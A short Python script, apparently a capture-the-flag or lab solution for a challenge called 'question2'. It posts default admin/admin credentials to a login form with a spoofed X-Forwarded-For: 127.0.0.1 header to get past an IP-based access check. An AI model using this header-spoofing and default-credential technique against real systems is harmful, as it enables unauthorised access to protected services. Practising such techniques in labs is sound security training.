

import requests

url = "http://188.166.173.208:30224/question2/"


#userid=admin&passwd=admin&submit=submit
data2 = {
	"userid":"admin",
	"passwd":"admin",
	"submit":"submit"
}


headers2 = {
	"X-Forwarded-For":"127.0.0.1"
}

r = requests.post(url,data=data2,headers=headers2)

print(r.text)
